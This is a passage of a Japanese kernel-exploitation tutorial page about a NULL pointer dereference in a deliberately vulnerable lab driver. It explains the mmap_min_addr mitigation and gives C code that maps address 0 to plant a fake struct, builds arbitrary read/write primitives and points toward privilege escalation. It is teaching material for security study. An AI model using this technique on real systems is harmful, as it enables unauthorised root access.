class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>データが暗号化・復号できていたら成功です。</p>
+<center>
+  <img src="img/angus_usage.png" alt="Angusモジュールの通常の利用" style="width:320px;">
+</center>
+<p>次にXorCipherを初期化せずに暗号化してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//angus_init();</span></span><br><span class="line">  angus_encrypt();</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>これを実行すると、次のようにカーネルパニックに陥るかと思います。</p>
+<center>
+  <img src="img/angus_crash.png" alt="クラッシュの様子" style="width:640px;">
+</center>
+<p>BUGの項目を見ると「kernel NULL pointer dereference, address: 0000000000000008」とあり、解析した通りNULLポインタを参照しようとしてクラッシュしていることが分かります。<br>
+NULLポインタ参照はユーザー空間のプログラムでも度々発生しますが、このバグは通常exploitableではありません。では、今回はどのようにこのバグを使って権限昇格するのでしょうか。</p>
+<h2><span id="仮想メモリとmmap_min_addr">仮想メモリとmmap_min_addr</span></h2>
+<p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt">Linuxの仕様</a>として、仮想メモリはアドレスによって使用用途が異なります。例えば<code>0000000000000000</code>から<code>00007fffffffffff</code>まではユーザー空間が自由に使えます。また、<code>ffffffff80000000</code>から<code>ffffffff9fffffff</code>まではカーネルデータの領域で、物理アドレス0にマップされています。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="オオカミくん"></div>
+  <p class="says">
+    Linuxでは48ビットのアドレスを64ビットに符号付き拡張するよ。だから0x800000000000から0xffff7fffffffffffまではアドレスとして不正で、non-canonicalと呼ばれているんだね。
+  </p>
+</div>
+<p><code>0000000000000000</code>から<code>00007fffffffffff</code>まではユーザー空間が使えます。つまり、アドレス0がマップされているとき、NULLポインタ参照はSegmentation Faultを起こさずにデータを読み書きできます。カーネル空間のNULLポインタ参照では、SMAPが無効のときはユーザー空間のデータを読めるので、攻撃者が意図的にアドレス0に用意したデータを使ってしまうのです。</p>
+<p><code>mmap</code>では通常第一引数が0(NULL)のときは、どのアドレスにマップするかをカーネルに任せます。しかし、<code>MAP_FIXED</code>フラグを付けてマップすれば必ずそのアドレスにマップする（か失敗する）ようになり、アドレス0にメモリを確保できます。（KPTIが有効なので<code>MAP_POPULATE</code>も忘れないようにしましょう。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,</span><br><span class="line">     <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>今回の攻撃対象のマシンでもこの方法でアドレス0にメモリを確保できますが、みなさんの普段使っているLinuxマシンでは上記コードは失敗するかと思います。<br>
+LinuxにはNULL pointer dereferenceに対するmitigationとして<code>mmap_min_addr</code>という変数があります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/mmap_min_addr</span><br><span class="line">65536</span><br></pre></td></tr></table></figure>
+<p>ユーザー空間からこのアドレスよりも小さいアドレスにメモリをマップすることはできません。そのため通常NULL pointer dereferenceはunexploitableですが、今回の攻撃対象ではこの値が0に設定されているため攻撃可能となります。</p>
+<h2><span id="権限昇格">権限昇格</span></h2>
+<p><code>XorCipher</code>構造体をNULLポインタ参照してしまうので、攻撃者はアドレス0に偽の<code>XorCipher</code>構造体を用意します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *key;</span><br><span class="line">  <span class="keyword">char</span> *data;</span><br><span class="line">  <span class="keyword">size_t</span> keylen;</span><br><span class="line">  <span class="keyword">size_t</span> datalen;</span><br><span class="line">&#125; XorCipher;</span><br></pre></td></tr></table></figure>
+<p><code>data</code>ポインタと<code>datalen</code>を操作すれば、<code>CMD_GETDATA</code>で任意アドレスからデータを読み出せることが分かります。また、<code>data</code>ポインタと<code>datalen</code>、さらに<code>key</code>と<code>keylen</code>を適切に設定すれば、任意アドレスのデータを書き換えられます。<br>
+したがって、今回の脆弱性ではAAR/AAWという非常に強力なprimitiveが作れます。<code>CMD_GETDATA</code>では<code>copy_to_user</code>を使ってカーネル空間からユーザー空間にデータを転送します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p><code>copy_to_user</code>や<code>copy_from_user</code>といった関数は、誤ってマップされていないアドレスが渡されてもクラッシュせずに失敗するように設計されています。したがって、KASLRが有効な場合でも、適当にアドレスを決めて総当り的にデータを読んでいけば、いつか<code>copy_to_user</code>が成功します。</p>
+<p>何はともあれAAR/AAWを作って、ユーザー空間のデータを読み書きすることで実装を確認しましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">XorCipher *<span class="literal">nullptr</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AAR</span><span class="params">(<span class="keyword">char</span> *dst, <span class="keyword">char</span> *src, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="literal">nullptr</span>-&gt;data = src;</span><br><span class="line">  <span class="literal">nullptr</span>-&gt;datalen = len;</span><br><span class="line">  angus_getdata(dst, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AAW</span><span class="params">(<span class="keyword">char</span> *dst, <span class="keyword">char</span> *src, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// xorでAAWするので、元データを先に読んでおく</span></span><br><span class="line">  <span class="keyword">char</span> *tmp = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) fatal(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">  AAR(tmp, dst, len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// xorすると書き込みたいデータになるように調整</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    tmp[i] ^= src[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 書き込み</span></span><br><span class="line">  <span class="literal">nullptr</span>-&gt;data = dst;</span><br><span class="line">  <span class="literal">nullptr</span>-&gt;datalen = len;</span><br><span class="line">  <span class="literal">nullptr</span>-&gt;key = tmp;</span><br><span class="line">  <span class="literal">nullptr</span>-&gt;keylen = len;</span><br><span class="line">  angus_encrypt();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 偽のXorCipher構造体をNULLポインタに用意</span></span><br><span class="line">  <span class="keyword">if</span> (mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE,</span><br><span class="line">           <span class="number">-1</span>, <span class="number">0</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AAR/AAWのテスト</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">  AAR(buf, <span class="string">&quot;Hello, World!&quot;</span>, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;AAR: %s\n&quot;</span>, buf);</span><br><span class="line">  AAW(buf, <span class="string">&quot;This is a test&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;AAW: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>AAR/AAWが成功しました！</p>
+<center>
+  <img src="img/angus_aaraaw.png" alt="AAR/AAW primitiveの作成" style="width:280px;">
+</center>
+<p>あとはカーネルのベースアドレスを探したり、<code>cred</code>構造体を探したり、自由な手法で権限昇格してみてください。サンプルのexploitコードは<a href="exploit/angus_exploit.c">ここ</a>からダウンロードできます。</p>
+<center>
+  <img src="img/angus_privesc.png" alt="権限昇格" style="width:320px;">
+</center>
+<hr>
+<div class="column" title="例題">
+  <code>cred</code>構造体を見つける方法、カーネルのベースアドレスを見つける方法などを試し、どの手法が平均的に最も速く終わるかを調べましょう。また、それぞれの手法の利点と欠点は何でしょうか。
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>当然<code>lseek</code>のハンドラもカーネルモジュール側が正しく実装する必要があります。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK01/race_condition.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK03/double_fetch.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
